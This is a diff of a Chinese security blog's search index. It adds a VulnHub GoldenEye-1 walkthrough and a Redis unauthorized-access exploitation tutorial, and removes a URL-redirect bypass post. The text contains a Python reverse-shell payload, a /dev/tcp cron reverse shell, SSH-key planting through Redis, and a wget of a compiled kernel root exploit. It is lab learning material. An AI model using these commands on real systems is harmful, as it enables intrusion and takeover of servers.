@@ -1,6 +1,71 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>GoldenEye-1</title>
+    <url>/2021/04/14/GoldenEye-1/</url>
+    <content><![CDATA[<h2 id="GoldenEye-1"><a href="#GoldenEye-1" class="headerlink" title="GoldenEye-1"></a>GoldenEye-1</h2><h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01  前言"></a>0x01  前言</h3><p>今天开始vulnhub靶场挑战之路，加油</p>
+<span id="more"></span>
+
+<h3 id="0x02-信息收集"><a href="#0x02-信息收集" class="headerlink" title="0x02  信息收集"></a>0x02  信息收集</h3><p>使用arp-scan扫存活</p>
+<p><img src="/2021/04/14/GoldenEye-1/1.png"></p>
+<p>发现主机存活，使用nmap扫描端口</p>
+<p><img src="/2021/04/14/GoldenEye-1/2.png"></p>
+<p>访问80端口，根据提示，访问/sev-home/，是个登录页面，查看源代码，发现js文件里暴露两个名字：Boris和Natalya。对字符串符号进行html解密，密码为InvincibleHack3r。登录后，也在js文件里发现这两个用户是超级用户。尝试爆破pop3，成功爆出两个pop3邮箱服务的账号密码。分别为：(Natalya/bird,Boris/secret1!)</p>
+<p><img src="/2021/04/14/GoldenEye-1/3.png"></p>
+<p>使用nc登录pop3邮箱，使用retr命令查看邮件内容，在Natalya账号发现新的账号密码</p>
+<p><img src="/2021/04/14/GoldenEye-1/4.png"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">retr 2</span><br><span class="line">+OK 1048 octets</span><br><span class="line">Return-Path: &lt;root@ubuntu&gt;</span><br><span class="line">X-Original-To: natalya</span><br><span class="line">Delivered-To: natalya@ubuntu</span><br><span class="line">Received: from root (localhost [127.0.0.1])</span><br><span class="line">        by ubuntu (Postfix) with SMTP id 17C96454B1</span><br><span class="line">        for &lt;natalya&gt;; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)</span><br><span class="line">Message-Id: &lt;20180425031956.17C96454B1@ubuntu&gt;</span><br><span class="line">Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)</span><br><span class="line">From: root@ubuntu</span><br><span class="line"></span><br><span class="line">好的，娜塔琳，我有一个新学生给你。由于这是一个新的系统，请让我或鲍里斯知道如果你看到任何配置问题，特别是它与安全有关…即使它不是，只是进入它的伪装下的“安全”…它会得到变更单升级没有太多麻烦：）</span><br><span class="line"></span><br><span class="line">好的，用户信誉是：</span><br><span class="line"></span><br><span class="line">username: xenia</span><br><span class="line">password: RCP90rulez!</span><br><span class="line"></span><br><span class="line">Boris确认她是一个有效的承包商所以就创建一个帐户好吗？</span><br><span class="line"></span><br><span class="line">如果你没有外部内部域名的网址：severnaya-station.com&#x2F;gnocertdir</span><br><span class="line">**请务必编辑您的主机文件，因为您通常在远程网络之外工作。。。。</span><br><span class="line"></span><br><span class="line">既然您是Linux用户，只需将此服务器IP指向severnaya-station.com在&#x2F;etc&#x2F;hosts中</span><br></pre></td></tr></table></figure>
+
+<p>根据提示，ip绑定host，并且使用xenia账号成功登陆moodle系统，发现doak博士发来的新信息，猜测dock博士有pop3账号，进行爆破，得到账号(doak/goat)</p>
+<p><img src="/2021/04/14/GoldenEye-1/5.png"></p>
+<p><img src="/2021/04/14/GoldenEye-1/6.png"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Doak博士的新消息</span><br><span class="line"></span><br><span class="line">你好，Xenia，作为我们GoldenEye培训的新承包商，我欢迎你。一旦您的帐户已完成，更多的课程将出现在您的仪表板上。如果你有任何问题请给我留言。。。</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/04/14/GoldenEye-1/7.png"></p>
+<p>登陆doak的pop3账号，发现dr_doak登陆账号，并且成功登陆web系统</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop# nc 192.168.126.128 55007</span><br><span class="line">+OK GoldenEye POP3 Electronic-Mail System</span><br><span class="line">user doak</span><br><span class="line">+OK</span><br><span class="line">pass goat</span><br><span class="line">+OK Logged in.</span><br><span class="line">list</span><br><span class="line">+OK 1 messages:</span><br><span class="line">1 606</span><br><span class="line">.</span><br><span class="line">retr 1</span><br><span class="line">+OK 606 octets</span><br><span class="line">Return-Path: &lt;doak@ubuntu&gt;</span><br><span class="line">X-Original-To: doak</span><br><span class="line">Delivered-To: doak@ubuntu</span><br><span class="line">Received: from doak (localhost [127.0.0.1])</span><br><span class="line">        by ubuntu (Postfix) with SMTP id 97DC24549D</span><br><span class="line">        for &lt;doak&gt;; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)</span><br><span class="line">Message-Id: &lt;20180425034731.97DC24549D@ubuntu&gt;</span><br><span class="line">Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)</span><br><span class="line">From: doak@ubuntu</span><br><span class="line"></span><br><span class="line">James,</span><br><span class="line">If you&#39;re reading this, congrats you&#39;ve gotten this far. You know how tradecraft works right?</span><br><span class="line"></span><br><span class="line">Because I don&#39;t. Go to our training site and login to my account....dig until you can exfiltrate further information......</span><br><span class="line"></span><br><span class="line">username: dr_doak</span><br><span class="line">password: 4England!</span><br></pre></td></tr></table></figure>
+
+<p>在管理信息处发现s3cret.txt文件，下载下来，发现for-007.jpg文件。</p>
+<p><img src="/2021/04/14/GoldenEye-1/8.png"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">007,</span><br><span class="line">我能够捕捉到这个应用程序ADM1NCR3DS通过清除txt。</span><br><span class="line">GoldenEye服务器中的大多数web应用程序中的文本都会被扫描，所以我不能在这里添加cr3元素。</span><br><span class="line">这里有一些有趣的东西：&#x2F;dir007key&#x2F;for-007.jpg</span><br><span class="line">你可能也知道，RCP-90比任何其他武器都要优越得多，而杀人执照是唯一的游戏方式。</span><br></pre></td></tr></table></figure>
+
+<p>使用strings查看图片，发现base64加密，解密:xWinter1995x!尝试登陆web admin账号，成功登陆</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;Downloads# strings for-007.jpg </span><br><span class="line">JFIF</span><br><span class="line">Exif</span><br><span class="line">eFdpbnRlcjE5OTV4IQ&#x3D;&#x3D;</span><br><span class="line">GoldenEye</span><br><span class="line">linux</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x03-Getshell"><a href="#0x03-Getshell" class="headerlink" title="0x03  Getshell"></a>0x03  Getshell</h3><p>在获得对moodle的管理员访问权后，获得reverse shell相当容易。在“moodle”设置上，存在用于配置系统路径的设置。Aspell是拼写检查器，可以安装在Linux上，并且可以在moodle中用于进行拼写检查操作。每当启动拼写检查动作时，moodle就会调用Aspell二进制文件。可以编辑Aspell的路径以获得reverse shell。以下是我使用的payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.126.129&quot;,9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/04/14/GoldenEye-1/9.png"></p>
+<p>然后将下图所示设置选项设置成:PspellShell，不设置的话，无法执行之前的payload</p>
+<p><img src="/2021/04/14/GoldenEye-1/10.png"></p>
+<p>任意用户post一篇博客，攻击机做好监听，即可反弹shell</p>
+<p><img src="/2021/04/14/GoldenEye-1/11.png"></p>
+<p><img src="/2021/04/14/GoldenEye-1/12.png"></p>
+<h3 id="0x04-提权"><a href="#0x04-提权" class="headerlink" title="0x04  提权"></a>0x04  提权</h3><p>查看linux内核，发现版本为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@ubuntu:&#x2F;tmp$ uname -a</span><br><span class="line">Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU&#x2F;Linux</span><br></pre></td></tr></table></figure>
+
+<p>去exploit-db网站查找提权文件，下载下来，由于目标机器没有gcc环境，但是存在cc环境，修改提权文件某处gcc为cc</p>
+<p><img src="/2021/04/14/GoldenEye-1/13.png"></p>
+<p>在攻击机上先编译，然后攻击机用python3开启http服务，目标机器使用wget下载已经编译好的文件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;power# cc 37292.c -o shell</span><br><span class="line">37292.c: In function ‘main’:</span><br><span class="line">37292.c:106:12: warning: implicit declaration of function ‘unshare’ [-Wimplicit-function-declaration]</span><br><span class="line">  106 |         if(unshare(CLONE_NEWUSER) !&#x3D; 0)</span><br><span class="line">      |            ^~~~~~~</span><br><span class="line">37292.c:111:17: warning: implicit declaration of function ‘clone’; did you mean ‘close’? [-Wimplicit-function-declaration]</span><br><span class="line">  111 |                 clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);</span><br><span class="line">      |                 ^~~~~</span><br><span class="line">      |                 close</span><br><span class="line">37292.c:117:13: warning: implicit declaration of function ‘waitpid’ [-Wimplicit-function-declaration]</span><br><span class="line">  117 |             waitpid(pid, &amp;status, 0);</span><br><span class="line">      |             ^~~~~~~</span><br><span class="line">37292.c:127:5: warning: implicit declaration of function ‘wait’ [-Wimplicit-function-declaration]</span><br><span class="line">  127 |     wait(NULL);</span><br><span class="line">      |     ^~~~</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;power# ls</span><br><span class="line">37292.c  shell</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;power# python3 -m http.server 8000</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http:&#x2F;&#x2F;0.0.0.0:8000&#x2F;) ...</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@ubuntu:&#x2F;tmp$ wget http:&#x2F;&#x2F;192.168.126.129:8000&#x2F;shell</span><br><span class="line">wget http:&#x2F;&#x2F;192.168.126.129:8000&#x2F;shell</span><br><span class="line">--2021-04-14 16:44:48--  http:&#x2F;&#x2F;192.168.126.129:8000&#x2F;shell</span><br><span class="line">Connecting to 192.168.126.129:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 17608 (17K) [application&#x2F;octet-stream]</span><br><span class="line">Saving to: &#39;shell&#39;</span><br><span class="line"></span><br><span class="line">100%[&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;] 17,608      --.-K&#x2F;s   in 0s      </span><br><span class="line"></span><br><span class="line">2021-04-14 16:44:48 (379 MB&#x2F;s) - &#39;shell&#39; saved [17608&#x2F;17608]</span><br></pre></td></tr></table></figure>
+
+<p>提权成功</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@ubuntu:&#x2F;tmp$ chmod +x shell</span><br><span class="line">chmod +x shell</span><br><span class="line">www-data@ubuntu:&#x2F;tmp$ ls</span><br><span class="line">ls</span><br><span class="line">shell  tinyspellt5Wvx6  vmware-root</span><br><span class="line">www-data@ubuntu:&#x2F;tmp$ .&#x2F;shell</span><br><span class="line">.&#x2F;shell</span><br><span class="line">spawning threads</span><br><span class="line">mount #1</span><br><span class="line">mount #2</span><br><span class="line">child threads done</span><br><span class="line">&#x2F;etc&#x2F;ld.so.preload created</span><br><span class="line">creating shared library</span><br><span class="line"># id</span><br><span class="line">id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root),33(www-data)</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x05-寻找flag"><a href="#0x05-寻找flag" class="headerlink" title="0x05  寻找flag"></a>0x05  寻找flag</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># cd &#x2F;root</span><br><span class="line">cd &#x2F;root</span><br><span class="line"># ls -a</span><br><span class="line">ls -a</span><br><span class="line">.  ..  .bash_history  .bashrc  .cache  .flag.txt  .profile  .rnd  .viminfo</span><br><span class="line"># vi .flag.txt</span><br><span class="line">vi .flag.txt</span><br><span class="line">Alec told me to place the codes here:</span><br><span class="line"></span><br><span class="line">568628e0d993b1973adc718237da6e93</span><br><span class="line"></span><br><span class="line">If you captured this make sure to go here.....</span><br><span class="line">&#x2F;006-final&#x2F;xvf7-flag&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/04/14/GoldenEye-1/14.png"></p>
+]]></content>
+      <categories>
+        <category>靶场</category>
+      </categories>
+      <tags>
+        <tag>vulnhub</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>谷歌云机器运维</title>
     <url>/2021/03/05/Google-Hey/</url>
     <content><![CDATA[<h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01  前言"></a>0x01  前言</h3><p>每次白嫖谷歌云，都要重新部署服务器，此篇记录一下，日后好翻看。服务器是debain10。</p>
@@ -52,29 +117,72 @@
       </tags>
   </entry>
   <entry>
-    <title>URL跳转绕过</title>
-    <url>/2021/03/15/url%E8%B7%B3%E8%BD%AC%E7%BB%95%E8%BF%87/</url>
-    <content><![CDATA[<h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01  前言"></a>0x01  前言</h3><p>这里记录一下URL重定向绕过的方法</p>
-<span id="more"></span>
+    <title>redis未授权访问漏洞</title>
+    <url>/2021/03/22/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h3 id="0x01-应用介绍"><a href="#0x01-应用介绍" class="headerlink" title="0x01  应用介绍"></a>0x01  应用介绍</h3><p>Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、 Key-Value数据库。和Memcached类似，它支持存储的value 类型相对更多，包括 string(字符串)、list ( 链表)、 set(集合)、zset(sorted set – 有序集合)和 hash（哈希类型）。这些数据类型都支持push/pop 、 add/remove 及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上， redis支持各种不同方式的排序。与 memcached 一样，为了保证效率，数据都是缓存在内存中。区别的是 redis 会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了 master-slave ( 主从)同步。<span id="more"></span></p>
+<h3 id="0x02-漏洞介绍"><a href="#0x02-漏洞介绍" class="headerlink" title="0x02  漏洞介绍"></a>0x02  漏洞介绍</h3><p>Redis因配置不当可以导致未授权访问，被攻击者恶意利用。当前流行的针对Redis未授权访问的一种新型攻击方式，在特定条件下，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器，可导致服务器权限被获取和数据删除、泄露或加密勒索事件发生，严重危害业务正常服务。　　部分服务器上的Redis 绑定在 0.0.0.0:6379，并且没有开启认证（这是Redis 的默认配置），以及该端口可以通过公网直接访问，如果没有采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，将会导致 Redis 服务直接暴露在公网上，可能造成其他用户可以直接在非授权情况下直接访问Redis服务并进行相关操作。</p>
+<h3 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03  环境搭建"></a>0x03  环境搭建</h3><p>搭建系统：cenos6                        </p>
+<p>ip: 192.168.116.131</p>
+<p>下载redis</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-3.2.11.tar.gz </span><br></pre></td></tr></table></figure>
 
-<h3 id="0x02-利用问号绕过"><a href="#0x02-利用问号绕过" class="headerlink" title="0x02  利用问号绕过"></a>0x02  利用问号绕过</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">http://www.bbb.com/xxx.php?redict=http://www.baidu.com/?www.bbb.com</span><br></pre></td></tr></table></figure>
+<p>解压安装</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar zxvf redis-3.2.11.tar.gz   </span><br><span class="line">cd redis-3.2.11</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
 
-<h3 id="0x03-利用-绕过"><a href="#0x03-利用-绕过" class="headerlink" title="0x03  利用@绕过"></a>0x03  利用@绕过</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">http://www.bbb.com/xxx.php?redict=http://www.bbb.com@www.baidu.com</span><br></pre></td></tr></table></figure>
+<p>将redis-server和redis-cli拷贝到/usr/bin目录下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd src</span><br><span class="line">cp redis-server &#x2F;usr&#x2F;bin&#x2F;</span><br><span class="line">cp redis-cli &#x2F;usr&#x2F;bin&#x2F;</span><br></pre></td></tr></table></figure>
 
-<h3 id="0x04-利用-号绕过"><a href="#0x04-利用-号绕过" class="headerlink" title="0x04  利用#号绕过"></a>0x04  利用#号绕过</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">http://www.bbb.com/xxx.php?redict=http://www.baidu.com#www.bbb.com</span><br></pre></td></tr></table></figure>
+<p>返回目录redis-3.2.11，拷贝配置文件到/etc/目录下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cp redis.conf &#x2F;etc&#x2F;</span><br></pre></td></tr></table></figure>
 
-<h3 id="0x05-利用多级域名绕过"><a href="#0x05-利用多级域名绕过" class="headerlink" title="0x05  利用多级域名绕过"></a>0x05  利用多级域名绕过</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">http://www.bbb.com/xxx.php?redict=http://bbb.com.baidu.com</span><br></pre></td></tr></table></figure>
+<p>启动redis服务</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis-server &#x2F;etc&#x2F;redis.conf</span><br></pre></td></tr></table></figure>
 
-<h3 id="0x06-利用数字地址来绕过"><a href="#0x06-利用数字地址来绕过" class="headerlink" title="0x06  利用数字地址来绕过"></a>0x06  利用数字地址来绕过</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">将ip转为数字地址，比如http://111.111.111.111--&gt;http://1869573999</span><br><span class="line">若url跳转白名单通过.来进行分割，我们就能用这种方式绕过</span><br><span class="line">http://www.bbb.com/xxx.php?reidct=http://1869573999/www.bbb.com</span><br></pre></td></tr></table></figure>
+<p>编辑/etc/redis.conf文件</p>
+<ul>
+<li>去掉ip绑定，允许除本地外的主机远程登录redis服务 前面加#注释掉</li>
+</ul>
+<p><img src="/2021/03/22/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/redis-1.png"></p>
+<ul>
+<li>关闭保护模式，允许远程连接redis服务，将yes 改为no</li>
+</ul>
+<p><img src="/2021/03/22/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/redis-2.png"></p>
+<p>redis客户端连接</p>
+<p><img src="/2021/03/22/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/redis-4.png"></p>
+<h3 id="0x04-写入ssh公钥"><a href="#0x04-写入ssh公钥" class="headerlink" title="0x04  写入ssh公钥"></a>0x04  写入ssh公钥</h3><p>先在攻击机生成ssh公钥</p>
+<p>将公钥写入key.txt文件（前后用\n换行，避免和redis里其他缓存数据混合）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(echo -e&quot;\n&quot;;cat id_rsa.pub;echo -e &quot;\n&quot;)&gt;key.txt</span><br><span class="line">&#x2F;&#x2F;window不能使用这条命令，把id_rsa.pub文件放到linux机器上操作</span><br></pre></td></tr></table></figure>
 
-<h3 id="0x07-白名单绕过"><a href="#0x07-白名单绕过" class="headerlink" title="0x07  白名单绕过"></a>0x07  白名单绕过</h3><p>利用百度等搜索引擎可以搜到你的域名，且百度域名是URL跳转白名单里的，那你就能借助百度的超链接域名来绕过跳转限制。</p>
+<p>把key.txt文件内容写入目标主机的缓冲里</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat C:&#x2F;Users&#x2F;12926&#x2F;.ssh&#x2F;key.txt | &quot;.&#x2F;redis-cli.exe&quot; -h 192.168.116.131 -x set test</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/22/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/redis-5.png"></p>
+<p>连接目标主机的Redis</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\redis-cli.exe -h 192.168.116.131</span><br></pre></td></tr></table></figure>
+
+<p>设置redis的备份路径为/root/.ssh和保存文件名authorized_keys</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">config set dir &#x2F;root&#x2F;.ssh</span><br><span class="line">config set dbfilename authorized_keys</span><br></pre></td></tr></table></figure>
+
+<p>将数据保存在服务器硬盘上（缓存里的数据key.txt）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<p>ssh 免密连接成功</p>
+<p><img src="/2021/03/22/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/redis-7.png"></p>
+<p>可以在kali这边进入/root/.ssh目录，看一下authorized_keys的文件内容</p>
+<p><img src="/2021/03/22/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/redis-8.png"></p>
+<h3 id="0x05-定时任务反弹shell"><a href="#0x05-定时任务反弹shell" class="headerlink" title="0x05 定时任务反弹shell"></a>0x05 定时任务反弹shell</h3><p>原理是和写公钥一样的，只是变换一下写入的内容和路径，数据库名。</p>
+<ul>
+<li>首先在客户端这边监听一个端口（随便一个端口就好，不要冲突就好）</li>
+</ul>
+<p><img src="/2021/03/22/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/redis-9.png"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set xxx &quot;\n\n*&#x2F;1 * * * * &#x2F;bin&#x2F;bash -i&gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;192.168.116.129&#x2F;9999 0&gt;&amp;1\n\n&quot;</span><br><span class="line">config set dir &#x2F;var&#x2F;spool&#x2F;cron</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <categories>
-        <category>web安全</category>
+        <category>漏洞利用</category>
       </categories>
       <tags>
-        <tag>web漏洞</tag>
-        <tag>URL跳转</tag>
+        <tag>redis未授权</tag>
       </tags>
   </entry>
 </search>
